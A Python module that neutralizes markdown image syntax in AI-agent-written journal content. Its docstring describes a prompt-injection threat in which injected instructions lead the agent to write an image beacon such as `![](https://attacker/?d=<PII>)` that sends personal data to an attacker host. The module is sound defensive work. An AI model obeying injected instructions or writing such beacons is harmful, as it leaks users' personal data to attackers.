"""Write-boundary sanitizers for agent-authored journal/document content.

Defense in depth against P0-3 (upload security threat model, AC-6): an
injected instruction can make the agent write a markdown image beacon
(`![](https://attacker/?d=<PII>)`) into a durable store. The web renderer fix
(`frontend/components/markdown-renderer.tsx`) stops it from auto-loading
today, but a future renderer (iOS, email, a future web chat) might not know
to defend itself. Stripping the beacon at the agent write boundary means the
stored content can never become an auto-loading `<img>` regardless of which
renderer reads it later.

Nothing in this app writes legitimate markdown images (`git grep '!\['`
turns up none), so this neutralizes *every* markdown image form rather than
trying to distinguish remote from local URLs — inline (`![alt](url)`),
reference-style (`![alt][ref]`), angle-bracket destinations
(`![alt](<url>)`), and one level of nested brackets in the alt text
(`![a[b]c](url)`) are all covered.

Residual (not covered by design):
- A literal `\\![...]` (escaped bang) is left untouched — the author already
  neutralized it themselves; re-touching it would just produce different
  dead markdown.
- Raw HTML `<img src=...>` in the markdown source is not stripped here.
  `ReactMarkdown` in `markdown-renderer.tsx` does not render raw HTML by
  default, so this is inert on the web today — but a future renderer that
  *does* render raw HTML would need its own guard; this function only
  neutralizes markdown image syntax.
- An image reference split across a fenced code block boundary (so the
  `![...]( ` and the `)` land in different otherwise-unrelated text) is not
  specially detected; accepted as a rare edge case.
"""

from __future__ import annotations

import re

# Matches the "!" that turns `[...]...` into markdown image syntax, i.e. an
# unescaped "!" immediately followed by a bracketed label — allowing one
# level of nested brackets inside the label (`[a[b]c]`) — followed by
# optional whitespace and either "(" (inline destination, including
# angle-bracket forms like `(<url>)`) or "[" (reference-style `![alt][ref]`).
# The lookbehind `(?<!\\)` skips an escaped bang (`\![...]`), which the
# author already neutralized; the lookahead is zero-width, so only the "!"
# itself is removed and everything else (label, destination, whitespace)
# passes through unchanged.
_IMAGE_BANG_RE = re.compile(r"(?<!\\)!(?=\[(?:[^\[\]]|\[[^\]]*\])*\]\s*[(\[])")


def neutralize_remote_image_markdown(text: str) -> str:
    """Turn markdown image syntax `![alt](url)` / `![alt][ref]` into a plain
    link `[alt](url)` / `[alt][ref]` by dropping the leading "!".

    Every image form is affected (see module docstring for the exact
    coverage) except an already-escaped `\\![...]`, which is left as-is.
    Plain text and ordinary (non-image) links are returned untouched.
    """
    if not text:
        return text
    return _IMAGE_BANG_RE.sub("", text)
